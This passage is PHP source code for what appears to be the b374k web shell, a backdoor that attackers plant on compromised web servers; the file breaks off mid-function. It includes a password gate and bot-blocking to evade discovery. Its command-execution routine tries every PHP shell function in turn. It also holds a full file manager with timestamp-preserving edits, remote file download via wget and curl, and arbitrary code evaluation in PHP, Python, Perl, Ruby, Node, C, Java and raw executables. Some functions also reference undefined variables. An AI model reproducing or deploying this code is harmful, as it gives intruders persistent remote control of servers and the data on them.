<?php
$GLOBALS['ver'] = "3.2.3";
$GLOBALS['title'] = "b374k";

@ob_start();
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
// register_shutdown_function(function(){ var_dump(error_get_last()); });

@ini_set('html_errors', '0');
@ini_set('display_errors', '1');
@ini_set('display_startup_errors', '1');
@ini_set('log_errors', '0');
@set_time_limit(0);
@clearstatcache();

if (!function_exists('auth')) {
	function auth() {
		if (isset($GLOBALS['pass']) && (trim($GLOBALS['pass']) != '')) {
			$c = $_COOKIE;
			$p = $_POST;
			if (isset($p['pass'])) {
				$your_pass = sha1(md5($p['pass']));
				if ($your_pass == $GLOBALS['pass']) {
					setcookie("pass", $your_pass, time() + 36000, "/");
					header("Location: " . get_self());
				}
			}

			if (!isset($c['pass']) || ((isset($c['pass']) && ($c['pass'] != $GLOBALS['pass'])))) {
				$res = "<!doctype html>
		<html>
		<head>
		<meta charset='" . DETECT_SYS_CHARSET . "'>
		<meta name='robots' content='noindex, nofollow, noarchive'>
		<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'>
		</head>
		<body style='background:#f8f8f8;color:#000000;padding:0;margin:0;'><br><p><center><noscript>You need to enable javascript</noscript></center></p>
		<script type='text/javascript'>
		var d = document;
		d.write(\"<br><br><form method='post'><center><input type='password' id='pass' name='pass' style='font-size:34px;width:34%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\");
		d.getElementById('pass').focus();
		d.getElementById('pass').setAttribute('autocomplete', 'off');
		</script>
		</body></html>
		";
				echo $res;
				die();
			}
		}
	}
}

if (!function_exists('set_cookie')) {
	function set_cookie($key, $val) {
		setcookie($key, urlencode($val));
	}
}

if (!function_exists('get_cookie')) {
	function get_cookie($key) {
		$_COOKIE = fix_magic_quote($_COOKIE);
		if ($key) {
			return isset($_COOKIE[$key]) ? $_COOKIE[$key] : '';
		} else {
			return $_COOKIE;
		}
	}
}

if (!function_exists('convert_string_to_utf8')) {
	function convert_string_to_utf8($str = '') {
		return @mb_convert_encoding($str, 'UTF-8', mb_detect_encoding($str, "UTF-8, GB2312", true));
	}
}

if (!function_exists('convert_string_to_sys')) {
	function convert_string_to_sys($str = '') {
		if (is_win()) {
			return @mb_convert_encoding($str, 'GB2312', 'UTF-8');
		} else {
			return $str;
		}
	}
}

if (!function_exists('get_server_info')) {
	function get_server_info() {
		$freeSpace = @diskfreespace(get_cwd());
		$totalSpace = @disk_total_space(get_cwd());
		$totalSpace = $totalSpace ? $totalSpace : 1;
		// added by xqbumu
		if (!function_exists('posix_getegid')) {
			$user = @get_current_user();
			$uid = @getmyuid();
			$gid = @getmygid();
			$group = "?";
		} else {
			$uid = @posix_getpwuid(@posix_geteuid());
			$gid = @posix_getgrgid(@posix_getegid());
			$user = $uid['name'];
			$uid = $uid['uid'];
			$group = $gid['name'];
			$gid = $gid['gid'];
		}
		$server_addr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : $_SERVER["HTTP_HOST"];
		$server_info['uname'] = "Uname : " . php_uname();
		$server_info['user'] = "User : " . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' ) ';
		$server_info['php'] = "PHP : " . @phpversion() . ' <span>Safe mode:</span> ' . (isset($GLOBALS['safe_mode']) && $GLOBALS['safe_mode'] ? '<font color=red>ON</font>' : '<font color=#FF005F><b>OFF</b></font>') . ' <a href=#!info>[ phpinfo ]</a> <span>Datetime <span class=\'strong\'>@</span> Server:</span> ' . date('Y-m-d H:i:s');
		$server_info['hdd'] = "HDD : " . FileManagerClass::format_bit($totalSpace) . ' <span>Free:</span> ' . FileManagerClass::format_bit($freeSpace) . ' (' . round(100 / ($totalSpace / $freeSpace), 2) . '%)';
		$server_info['ip_adrress'] = "Server IP : " . $server_addr . " <span class='strong'>|</span> Your IP : " . $_SERVER['REMOTE_ADDR'];
		$server_software = (getenv('SERVER_SOFTWARE') != '') ? getenv('SERVER_SOFTWARE') . " <span class='strong'>|</span> " : '';
		$server_info['software'] = $server_software . "  PHP " . phpversion();
		return $server_info;
	}
}

if (!function_exists('get_server_info_html')) {
	function get_server_info_html() {
		$server_info_html = '';
		foreach (get_server_info() as $k => $v) {
			$server_info_html .= "<div>" . $v . "</div>";
		}
		return $server_info_html;
	}
}

if (!function_exists('get_self')) {
	function get_self() {
		$query = (isset($_SERVER["QUERY_STRING"]) && (!empty($_SERVER["QUERY_STRING"]))) ? "?" . $_SERVER["QUERY_STRING"] : "";
		if ($query && strpos($_SERVER["REQUEST_URI"], $query)) {
			return html_safe($_SERVER["REQUEST_URI"]);
		} else {
			return html_safe($_SERVER["REQUEST_URI"] . $query);
		}
	}
}

if (!function_exists('get_post')) {
	function get_post() {
		$filename_param_keys = array('cd', 'viewFile', 'newFile', 'editFilename', 'delete',
			'renameFile', 'renameFileTo', 'newFolder', 'massBuffer', 'massPath',
			'scannerPath');
		$res = fix_magic_quote($_POST);
		foreach ($res as $k => $v) {
			if (in_array($k, $filename_param_keys)) {
				$res[$k] = convert_string_to_sys($v);
			}
		}
		return $res;
	}
}

if (!function_exists('get_nav')) {
	function get_nav($path) {
		return parse_dir($path);
	}
}

if (!function_exists('get_cwd')) {
	function get_cwd() {
		$cwd = getcwd() . DIRECTORY_SEPARATOR;
		if (!isset($_COOKIE['cwd'])) {
			set_cookie("cwd", $cwd);
		} else {
			$cwd_c = rawurldecode($_COOKIE['cwd']);
			if (is_dir($cwd_c)) {
				$cwd = realpath($cwd_c) . DIRECTORY_SEPARATOR;
			} else {
				set_cookie("cwd", $cwd);
			}

		}
		return $cwd;
	}
}

if (!function_exists('wrap_with_quotes')) {
	function wrap_with_quotes($str) {
		return "\"" . $str . "\"";
	}
}

if (!function_exists('get_resource')) {
	function get_resource($type) {
		if (isset($GLOBALS['resources'][$type])) {
			return gzinflate(base64_decode($GLOBALS['resources'][$type]));
		}
		return false;
	}
}

if (!function_exists('block_bot')) {
	function block_bot() {
		// block search engine bot
		if (isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT']))) {
			header("HTTP/1.0 404 Not Found");
			header("Status: 404 Not Found");
			die();
		} elseif (!isset($_SERVER['HTTP_USER_AGENT'])) {
			header("HTTP/1.0 404 Not Found");
			header("Status: 404 Not Found");
			die();
		}
	}
}

if (!function_exists('is_win')) {
	function is_win() {
		return (strtolower(substr(php_uname(), 0, 3)) == "win") ? true : false;
	}
}

if (!function_exists('value')) {
	function value($value) {
		return (is_callable($value) and !is_string($value)) ? call_user_func($value) : $value;
	}
}

if (!function_exists('fix_magic_quote')) {
	function fix_magic_quote($arr) {
		$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
		if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
			if (is_array($arr)) {
				foreach ($arr as $k => $v) {
					if (is_array($v)) {
						$arr[$k] = clean($v);
					} else {
						$arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off') ? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
					}

				}
			}
		}
		return $arr;
	}
}

if (!function_exists('execute')) {
	function execute($code) {
		$output = "";
		$code = $code . " 2>&1";

		if (is_callable('system') && function_exists('system')) {
			ob_start();
			@system($code);
			$output = ob_get_contents();
			ob_end_clean();
			if (!empty($output)) {
				return $output;
			}

		} elseif (is_callable('shell_exec') && function_exists('shell_exec')) {
			$output = @shell_exec($code);
			if (!empty($output)) {
				return $output;
			}

		} elseif (is_callable('exec') && function_exists('exec')) {
			@exec($code, $res);
			if (!empty($res)) {
				foreach ($res as $line) {
					$output .= $line;
				}
			}

			if (!empty($output)) {
				return $output;
			}

		} elseif (is_callable('passthru') && function_exists('passthru')) {
			ob_start();
			@passthru($code);
			$output = ob_get_contents();
			ob_end_clean();
			if (!empty($output)) {
				return $output;
			}

		} elseif (is_callable('proc_open') && function_exists('proc_open')) {
			$desc = array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"));
			$proc = @proc_open($code, $desc, $pipes, getcwd(), array());
			if (is_resource($proc)) {
				while ($res = fgets($pipes[1])) {
					if (!empty($res)) {
						$output .= $res;
					}

				}
				while ($res = fgets($pipes[2])) {
					if (!empty($res)) {
						$output .= $res;
					}

				}
			}
			@proc_close($proc);
			if (!empty($output)) {
				return $output;
			}

		} elseif (is_callable('popen') && function_exists('popen')) {
			$res = @popen($code, 'r');
			if ($res) {
				while (!feof($res)) {
					$output .= fread($res, 2096);
				}
				pclose($res);
			}
			if (!empty($output)) {
				return $output;
			}

		}
		return "";
	}
}

if (!function_exists('html_safe')) {
	function html_safe($str) {
		return htmlspecialchars($str, 2 | 1);
	}
}

if (!function_exists('parse_dir')) {
	function parse_dir($path) {
		$path = realpath($path) . DIRECTORY_SEPARATOR;
		$paths = explode(DIRECTORY_SEPARATOR, $path);
		$res = "";
		for ($i = 0; $i < sizeof($paths) - 1; $i++) {
			$x = "";
			for ($j = 0; $j <= $i; $j++) {
				$x .= $paths[$j] . DIRECTORY_SEPARATOR;
			}

			$res .= "<a class='navbar' data-path='" . html_safe($x) . "'>" . html_safe($paths[$i]) . DIRECTORY_SEPARATOR . "</a>";
		}
		if (is_win()) {
			$res = get_drives() . $res;
		}

		return trim($res);
	}
}

if (!function_exists('zip')) {
	function zip($files, $archive) {
		$status = false;
		if (!extension_loaded('zip')) {
			return $status;
		}

		if (class_exists("ZipArchive")) {
			$zip = new ZipArchive();
			if (!$zip->open($archive, 1)) {
				return $status;
			}

			if (!is_array($files)) {
				$files = array($files);
			}

			foreach ($files as $file) {
				$file = str_replace(get_cwd(), '', $file);
				$file = str_replace('\\', '/', $file);
				if (is_dir($file)) {
					$filesIterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($file), 1);
					foreach ($filesIterator as $iterator) {
						$iterator = str_replace('\\', '/', $iterator);
						if (in_array(substr($iterator, strrpos($iterator, '/') + 1), array('.', '..'))) {
							continue;
						}

						if (is_dir($iterator)) {
							$zip->addEmptyDir(str_replace($file . '/', '', $iterator . '/'));
						} else if (is_file($iterator)) {
							$zip->addFromString(str_replace($file . '/', '', $iterator), $fmc->get($iterator));
						}

					}
				} elseif (is_file($file)) {
					$zip->addFromString(basename($file), $fmt->read_file($file));
				}

			}
			if ($zip->getStatusString() !== false) {
				$status = true;
			}

			$zip->close();
		}
		return $status;
	}
}

if (!function_exists('compress')) {
	function compress($type, $archive, $files) {
		if (!is_array($files)) {
			$files = array($files);
		}

		if ($type == 'zip') {
			if (zip($files, $archive)) {
				return true;
			} else {
				return false;
			}

		} elseif (($type == 'tar') || ($type == 'targz')) {
			$archive = basename($archive);

			$listsBasename = array_map("basename", $files);
			$lists = array_map("wrap_with_quotes", $listsBasename);

			if ($type == 'tar') {
				execute("tar cf \"" . $archive . "\" " . implode(" ", $lists));
			} elseif ($type == 'targz') {
				execute("tar czf \"" . $archive . "\" " . implode(" ", $lists));
			}

			if (is_file($archive)) {
				return true;
			} else {
				return false;
			}

		}
		return false;
	}
}

if (!function_exists('decompress')) {
	function decompress($type, $archive, $path) {
		$path = realpath($path) . DIRECTORY_SEPARATOR;
		$status = false;
		if (is_dir($path)) {
			chdir($path);
			if ($type == 'unzip') {
				if (class_exists('ZipArchive')) {
					$zip = new ZipArchive();
					$target = $path . basename($archive, ".zip");
					if ($zip->open($archive)) {
						if (!is_dir($target)) {
							mkdir($target);
						}

						if ($zip->extractTo($target)) {
							$status = true;
						}

						$zip->close();
					}
				}
			} elseif ($type == 'untar') {
				$target = basename($archive, ".tar");
				if (!is_dir($target)) {
					mkdir($target);
				}

				$before = count(FileManagerClass::get_all_files($target));
				execute("tar xf \"" . basename($archive) . "\" -C \"" . $target . "\"");
				$after = count(FileManagerClass::get_all_files($target));
				if ($before != $after) {
					$status = true;
				}

			} elseif ($type == 'untargz') {
				$target = "";
				if (strpos(strtolower($archive), ".tar.gz") !== false) {
					$target = basename($archive, ".tar.gz");
				} elseif (strpos(strtolower($archive), ".tgz") !== false) {
					$target = basename($archive, ".tgz");
				}

				if (!is_dir($target)) {
					mkdir($target);
				}

				$before = count(FileManagerClass::get_all_files($target));
				execute("tar xzf \"" . basename($archive) . "\" -C \"" . $target . "\"");
				$after = count(FileManagerClass::get_all_files($target));
				if ($before != $after) {
					$status = true;
				}

			}
		}
		return $status;
	}
}

if (!function_exists('download')) {
	function download($url, $saveas) {
		if (!preg_match("/[a-z]+:\/\/.+/", $url)) {
			return false;
		}

		$filename = basename($url);

		if ($content = $fmc->get($url)) {
			if (is_file($saveas)) {
				unlink($saveas);
			}

			if ($fmc->put($saveas, $content)) {
				return true;
			}
		}

		$buff = execute("wget " . $url . " -O " . $saveas);
		if (is_file($saveas)) {
			return true;
		}

		$buff = execute("curl " . $url . " -o " . $saveas);
		if (is_file($saveas)) {
			return true;
		}

		$buff = execute("lwp-download " . $url . " " . $saveas);
		if (is_file($saveas)) {
			return true;
		}

		$buff = execute("lynx -source " . $url . " > " . $saveas);
		if (is_file($saveas)) {
			return true;
		}

		return false;
	}
}

if (!function_exists('rmdirs')) {
	function rmdirs($dir, $counter = 0) {
		if (is_dir($dir)) {
			$dir = realpath($dir) . DIRECTORY_SEPARATOR;
		}

		if ($dh = opendir($dir)) {
			while (($f = readdir($dh)) !== false) {
				if (($f != '.') && ($f != '..')) {
					$f = $dir . $f;
					if (@is_dir($f)) {
						$counter += rmdirs($f);
					} else {
						if (unlink($f)) {
							$counter++;
						}

					}
				}
			}
			closedir($dh);
			if (rmdir($dir)) {
				$counter++;
			}

		}
		return $counter;
	}
}

if (!function_exists('copys')) {
	function copys($source, $target, $c = 0) {
		$source = realpath($source) . DIRECTORY_SEPARATOR;
		if ($dh = opendir($source)) {
			if (!is_dir($target)) {
				mkdir($target);
			}

			$target = realpath($target) . DIRECTORY_SEPARATOR;

			while (($f = readdir($dh)) !== false) {
				if (($f != '.') && ($f != '..')) {
					if (is_dir($source . $f)) {
						copys($source . $f, $target . $f, $c);
					} else {
						if (copy($source . $f, $target . $f)) {
							$c++;
						}

					}
				}
			}
			closedir($dh);
		}
		return $c;
	}
}

if (!function_exists('view_file')) {
	function view_file($file, $type, $preserveTimestamp = 'true') {
		$fmc = new FileManagerClass();
		$output = "";
		if (is_file($file)) {
			$dir = $fmc->get_parent_path($file);
			$file_info = $fmc->get_file_info($file, true);

			if (!is_win()) {
				$owner = "<tr><td>Owner</td><td>" . $file_info['fileowner'] . "</td></tr>";
			}

			if ($type == "auto") {
				if (is_array($file_info['image_info'])) {
					$type = 'image';
				} elseif (strtolower(substr($file, -3, 3)) == "php") {
					$type = "code";
				} elseif (!empty($info['mime'])) {
					$type = "multimedia";
				} else {
					$type = "raw";
				}

			}

			$content = "";
			if ($type == "code") {
				$hl_arr = array(
					"hl_default" => ini_get('highlight.default'),
					"hl_keyword" => ini_get('highlight.keyword'),
					"hl_string" => ini_get('highlight.string'),
					"hl_html" => ini_get('highlight.html'),
					"hl_comment" => ini_get('highlight.comment'),
				);
				$content = highlight_string($fmc->get($file), true);
				foreach ($hl_arr as $k => $v) {
					$content = str_replace("<font color=\"" . $v . "\">", "<font class='" . $k . "'>", $content);
					$content = str_replace("<span style=\"color: " . $v . "\">", "<span class='" . $k . "'>", $content);
				}
			} elseif ($type == "image") {
				$width = (int) $file_info['image_info'][0];
				$height = (int) $file_info['image_info'][1];
				$image_info_h = "Image type = <span class='strong'>(</span> " . $file_info['image_info']['mime'] . " <span class='strong'>)</span><br>Image Size = <span class='strong'>( </span>" . $width . " x " . $height . "<span class='strong'> )</span><br>";
				if ($width > 800) {
					$width = 800;
					$imglink = "<p><a id='viewFullsize'><span class='strong'>[ </span>View Full Size<span class='strong'> ]</span></a></p>";
				} else {
					$imglink = "";
				}

				$content = "<center>" . $image_info_h . "<br>" . $imglink . "<img id='viewImage' style='width:" . $width . "px;' src='data:" . $file_info['image_info']['mime'] . ";base64," . base64_encode($fmc->get($file)) . "' alt='" . $file . "'></center>";
			} elseif ($type == "multimedia") {
				$content = "<center><video controls><source src='' type='" . $info['mime'] . "'></video><p><span class='button' onclick=\"multimedia('" . html_safe(addslashes($file)) . "');\">Load Multimedia File</span></p></center>";
			} elseif ($type == "edit") {
				$preservecbox = ($preserveTimestamp == 'true') ? " cBoxSelected" : "";
				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='" . html_safe($file) . "' onkeydown=\"trap_enter(event, 'edit_save_raw');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_raw();\">save</span></td><td style='vertical-align:middle;'><div class='cBox" . $preservecbox . "'></div><span>preserve modification timestamp</span><span id='editResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_raw');\">" . html_safe($fmc->get($file)) . "</textarea></td></tr></table>";
			} elseif ($type == "hex") {
				$preservecbox = ($preserveTimestamp == 'true') ? " cBoxSelected" : "";
				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='" . html_safe($file) . "' onkeydown=\"trap_enter(event, 'edit_save_hex');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_hex();\">save</span></td><td style='vertical-align:middle;'><div class='cBox" . $preservecbox . "'></div><span>preserve modification timestamp</span><span id='editHexResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_hex');\">" . bin2hex($fmc->get($file)) . "</textarea></td></tr></table>";
			} else {
				$content = "<pre>" . html_safe($fmc->get($file)) . "</pre>";
			}

			$output .= "
				<table id='viewFile' class='boxtbl'>
				<tr><td style='width:120px;'>Filename</td><td>" . html_safe($file) . "</td></tr>
				<tr><td>Size</td><td>" . $file_info['filesize_human'] . " (" . $file_info['filesize'] . ")</td></tr>
				<tr><td>Permission</td><td>" . $file_info['perms'] . '(' . $file_info['fileowner'] . ')' . "</td></tr>
				<tr><td>Create time</td><td>" . @date("d-M-Y H:i:s", filectime($file)) . "</td></tr>
				<tr><td>Last modified</td><td>" . @date("d-M-Y H:i:s", filemtime($file)) . "</td></tr>
				<tr><td>Last accessed</td><td>" . @date("d-M-Y H:i:s", fileatime($file)) . "</td></tr>
				<tr><td>MD5</td><td>" . md5_file($file) . "</td></tr>
				<tr class='file-info-actions' data-path='" . html_safe($file) . "'><td colspan='2'>
				<span class='navigate button' style='width:120px;'>explorer</span>
				<span class='action button' style='width:120px;'>action</span>
				<span class='button' style='width:120px;' onclick=\"view('" . html_safe(addslashes($file)) . "', 'raw');hide_box();\">raw</span>
				<span class='button' style='width:120px;' onclick=\"view('" . html_safe(addslashes($file)) . "', 'code');hide_box();\">code</span>
				<span class='button' style='width:120px;' onclick=\"view('" . html_safe(addslashes($file)) . "', 'hex');hide_box();\">hex</span>
				<span class='button' style='width:120px;' onclick=\"view('" . html_safe(addslashes($file)) . "', 'image');hide_box();\">image</span>
				<span class='button' style='width:120px;' onclick=\"view('" . html_safe(addslashes($file)) . "', 'multimedia');hide_box();\">multimedia</span>
				</td></tr>
				<tr><td colspan='2'><div id='viewFilecontent'>" . $content . "</div></td></tr>
				</table>";
		} else {
			$output = "error";
		}

		return $output;
	}
}

if (!function_exists('get_writabledir')) {
	function get_writabledir() {
		if (is_writable(".")) {
			return realpath(".") . DIRECTORY_SEPARATOR;
		} else {
			foreach (array('TMP', 'TEMP', 'TMPDIR') as $k) {
				if (!empty($_ENV[$k])) {
					if (is_writable($_ENV[$k])) {
						return realpath($_ENV[$k]) . DIRECTORY_SEPARATOR;
					}

				}
			}
			if (function_exists("sys_get_temp_dir")) {
				$dir = sys_get_temp_dir();
				if (is_writable($dir)) {
					return realpath($dir) . DIRECTORY_SEPARATOR;
				}

			} else {
				if (!is_win()) {
					if (is_writable("/tmp")) {
						return "/tmp/";
					}
				}
			}

			$tempfile = tempnam(__FILE__, '');
			if (file_exists($tempfile)) {
				$dir = realpath(FileManagerClass::get_parent_path($tempfile)) . DIRECTORY_SEPARATOR;
				unlink($tempfile);
				return $dir;
			}
		}
		return false;
	}
}

if (!function_exists('get_drives')) {
	function get_drives() {
		$drives = "";
		$v = explode("\\", get_cwd());
		$v = $v[0];
		foreach (range("A", "Z") as $letter) {
			if (@is_readable($letter . ":\\")) {
				$drives .= "<a class='navbar' data-path='" . $letter . ":\\" . "'>[ ";
				if ($letter . ":" != $v) {
					$drives .= $letter;
				} else { $drives .= "<span class='drive-letter'>" . $letter . "</span>";}
				$drives .= " ]</a> ";
			}
		}
		return $drives;
	}
}

if (!function_exists('show_all_files')) {
	function show_all_files($path) {
		$fmc = New FileManagerClass();
		$dir_info = $fmc->get_directory($path);
		if (!is_array($dir_info)) {
			return $dir_info;
		}

		$output = '';
		$output .= "<table id='xplTable' class='dataView sortable'><thead>";
		$output .= "<tr><th class='col-cbox sorttable_nosort'><div class='cBoxAll'></div></th><th class='col-name'>name</th><th class='col-size'>size</th>";

		foreach ($dir_info['extraCols'] as $v) {
			$output .= "<th class='col-" . $v . "'>" . $v . "</th>";
		}
		$output .= "</tr></thead><tbody>";

		foreach ($dir_info['allfolders'] as $dir => $info) {
			$output .= "
	<tr data-path=\"" . html_safe($dir) . "\"><td><div class='cBox" . $info['cboxException'] . "'></div></td>
	<td style='white-space:normal;'><a class='navigate'>[ " . html_safe($info['name']) . " ]</a><span class='" . $info['action'] . " floatRight'>Action</span></td>
	<td>DIR</td>";
			foreach ($info['cols'] as $v) {
				$sortable = " title='" . $info['filemtime'] . "'";
				$output .= "<td" . $sortable . ">" . $v . "</td>";
			}
			$output .= "</tr>";
		}

		foreach ($dir_info['allfiles'] as $file => $info) {
			$output .= "
	<tr data-path=\"" . html_safe($file) . "\"><td><div class='cBox'></div></td>
	<td class='explorer-row' style='white-space:normal;'><a class='view'>" . html_safe($info['name']) . "</a><span class='action floatRight'>Action</span></td>
	<td title='" . $info['filesize'] . "'>" . $info['filesize_human'] . "</td>";
			foreach ($info['cols'] as $v) {
				$sortable = " title='" . $info['filemtime'] . "'";
				$output .= "<td" . $sortable . ">" . $v . "</td>";
			}
			$output .= "</tr>";
		}

		$output .= "</tbody><tfoot>";

		$colspan = 1 + count($dir_info['extraCols']);
		$counterInfo = '';
		if (isset($dir_info['counter']) && is_array($dir_info['counter'])) {
			$counterInfoArr = array();
			foreach ($dir_info['counter'] as $key => $value) {
				array_push($counterInfoArr, $value . ' ' . $key);
			}
			$counterInfo = implode(',', $counterInfoArr);
		}
		$output .= "<tr><td><div class='cBoxAll'></div></td><td>
		<select id='massAction' class='colSpan'>
		<option disabled selected>Action</option>
		<option>cut</option>
		<option>copy</option>
		<option>paste</option>
		<option>delete</option>
		<option disabled>------------</option>
		<option>chmod</option>
		<option>chown</option>
		<option>touch</option>
		<option disabled>------------</option>
		<option>extract (tar)</option>
		<option>extract (tar.gz)</option>
		<option>extract (zip)</option>
		<option disabled>------------</option>
		<option>compress (tar)</option>
		<option>compress (tar.gz)</option>
		<option>compress (zip)</option>
		<option disabled>------------</option>
		</select>
		</td><td colspan='" . $colspan . "'></td></tr>
		<tr><td></td><td colspan='" . ++$colspan . "'>" . $counterInfo . "<span class='xplSelected'></span></td></tr>
		";
		$output .= "</tfoot></table>";
		return $output;
	}
}

if (!function_exists('eval_get_supported')) {
	function eval_get_supported() {
		$eval_supported = array();

		$eval_supported[] = "php";

		$check = strtolower(execute("python -h"));
		if (strpos($check, "usage") !== false) {
			$eval_supported[] = "python";
		}

		$check = strtolower(execute("perl -h"));
		if (strpos($check, "usage") !== false) {
			$eval_supported[] = "perl";
		}

		$check = strtolower(execute("ruby -h"));
		if (strpos($check, "usage") !== false) {
			$eval_supported[] = "ruby";
		}

		$check = strtolower(execute("node -h"));
		if (strpos($check, "usage") !== false) {
			$eval_supported[] = "node";
		} else {
			$check = strtolower(execute("nodejs -h"));
			if (strpos($check, "usage") !== false) {
				$eval_supported[] = "nodejs";
			}

		}

		$check = strtolower(execute("gcc --help"));
		if (strpos($check, "usage") !== false) {
			$eval_supported[] = "gcc";
		}

		$check = strtolower(execute("java -help"));
		if (strpos($check, "usage") !== false) {
			$check = strtolower(execute("javac -help"));
			if (strpos($check, "usage") !== false) {
				$eval_supported[] = "java";
			}

		}

		return implode(",", $eval_supported);
	}
}

if (!function_exists('eval_go')) {
	function eval_go($evalType, $evalCode, $evalOptions, $evalArguments) {
		$res = "";
		$output = "";
		if ($evalOptions != "") {
			$evalOptions = $evalOptions . " ";
		}

		if ($evalArguments != "") {
			$evalArguments = " " . $evalArguments;
		}

		if ($evalType == "php") {
			ob_start();
			eval($evalCode);
			$res = ob_get_contents();
			ob_end_clean();
			return $res;
		} elseif (($evalType == "python") || ($evalType == "perl") || ($evalType == "ruby") || ($evalType == "node") || ($evalType == "nodejs")) {
			$tmpdir = get_writabledir();
			chdir($tmpdir);

			$res .= "Using dir : " . $tmpdir;
			if (is_writable($tmpdir)) {
				$res .= " (writable)\n";
				$uniq = substr(md5(time()), 0, 8);
				$filename = $evalType . $uniq;
				$path = $filename;
				$res .= "Temporary file : " . $path;
				if ($fmc->put($path, $evalCode)) {
					$res .= " (ok)\n";
					$res .= "Setting permissions : 0755";
					if (chmod($path, 0755)) {
						$res .= " (ok)\n";
						$cmd = $evalType . " " . $evalOptions . $path . $evalArguments;
						$res .= "Execute : " . $cmd . "\n";
						$output = execute($cmd);
					} else {
						$res .= " (failed)\n";
					}

					$res .= "Deleting temporary file : " . $path;
					if (unlink($path)) {
						$res .= " (ok)\n";
					} else {
						$res .= " (failed)\n";
					}

				} else {
					$res .= " (failed)\n";
				}

			} else {
				$res .= " (not writable)\n";
			}

			$res .= "Finished...";
			return $res . "{[|b374k|]}" . $output;
		} elseif ($evalType == "gcc") {
			$tmpdir = get_writabledir();
			chdir($tmpdir);

			$res .= "Using dir : " . $tmpdir;
			if (is_writable($tmpdir)) {
				$res .= " (writable)\n";
				$uniq = substr(md5(time()), 0, 8);
				$filename = $evalType . $uniq . ".c";
				$path = $filename;
				$res .= "Temporary file : " . $path;
				if ($fmc->put($path, $evalCode)) {
					$res .= " (ok)\n";
					$ext = (is_win()) ? ".exe" : ".out";
					$pathres = $filename . $ext;
					$evalOptions = "-o " . $pathres . " " . $evalOptions;
					$cmd = "gcc " . $evalOptions . $path;
					$res .= "Compiling : " . $cmd;
					$res .= execute($cmd);
					if (is_file($pathres)) {
						$res .= " (ok)\n";
						$res .= "Setting permissions : 0755";
						if (chmod($pathres, 0755)) {
							$res .= " (ok)\n";
							$cmd = $pathres . $evalArguments;
							$res .= "Execute : " . $cmd . "\n";
							$output = execute($cmd);
						} else {
							$res .= " (failed)\n";
						}

						$res .= "Deleting temporary file : " . $pathres;
						if (unlink($pathres)) {
							$res .= " (ok)\n";
						} else {
							$res .= " (failed)\n";
						}

					} else {
						$res .= " (failed)\n";
					}

					$res .= "Deleting temporary file : " . $path;
					if (unlink($path)) {
						$res .= " (ok)\n";
					} else {
						$res .= " (failed)\n";
					}

				} else {
					$res .= " (failed)\n";
				}

			} else {
				$res .= " (not writable)\n";
			}

			$res .= "Finished...";
			return $res . "{[|b374k|]}" . $output;
		} elseif ($evalType == "java") {
			$tmpdir = get_writabledir();
			chdir($tmpdir);

			$res .= "Using dir : " . $tmpdir;
			if (is_writable($tmpdir)) {
				$res .= " (writable)\n";

				if (preg_match("/class\ ([^{]+){/i", $evalCode, $r)) {
					$classname = trim($r[1]);
					$filename = $classname;
				} else {
					$uniq = substr(md5(time()), 0, 8);
					$filename = $evalType . $uniq;
					$evalCode = "class " . $filename . " { " . $evalCode . " } ";
				}

				$path = $filename . ".java";
				$res .= "Temporary file : " . $path;
				if ($fmc->put($path, $evalCode)) {
					$res .= " (ok)\n";
					$cmd = "javac " . $evalOptions . $path;
					$res .= "Compiling : " . $cmd;
					$res .= execute($cmd);
					$pathres = $filename . ".class";
					if (is_file($pathres)) {
						$res .= " (ok)\n";
						$res .= "Setting permissions : 0755";
						if (chmod($pathres, 0755)) {
							$res .= " (ok)\n";
							$cmd = "java " . $filename . $evalArguments;
							$res .= "Execute : " . $cmd . "\n";
							$output = execute($cmd);
						} else {
							$res .= " (failed)\n";
						}

						$res .= "Deleting temporary file : " . $pathres;
						if (unlink($pathres)) {
							$res .= " (ok)\n";
						} else {
							$res .= " (failed)\n";
						}

					} else {
						$res .= " (failed)\n";
					}

					$res .= "Deleting temporary file : " . $path;
					if (unlink($path)) {
						$res .= " (ok)\n";
					} else {
						$res .= " (failed)\n";
					}

				} else {
					$res .= " (failed)\n";
				}

			} else {
				$res .= " (not writable)\n";
			}

			$res .= "Finished...";
			return $res . "{[|b374k|]}" . $output;
		} elseif ($evalType == "executable") {
			$tmpdir = get_writabledir();
			chdir($tmpdir);

			$res .= "Using dir : " . $tmpdir;
			if (is_writable($tmpdir)) {
				$res .= " (writable)\n";
				$uniq = substr(md5(time()), 0, 8);
				$filename = $evalType . $uniq . ".exe";
				$path = $filename;
				$res .= "Temporary file : " . $path;
				if ($fmc->put($path, $evalCode)) {
					$res .= " (ok)\n";
					$cmd = $path . $evalArguments;
					$res .= "Execute : " . $cmd . "\n";
					$output = execute($cmd);

					$res .= "Deleting temporary file : " . $path;
					if (unlink($path)) {
						$res .= " (ok)\n";
					} else {
						$res .= " (failed)\n";
					}

				} else {
					$res .= " (failed)\n";
				}

			} else {
				$res .= " (not writable)\n";
			}

			$res .= "Finished...";
			return $res . "{[|b374k|]}" . $output;
		}
		return false;
	}
}

if (!function_exists('output')) {
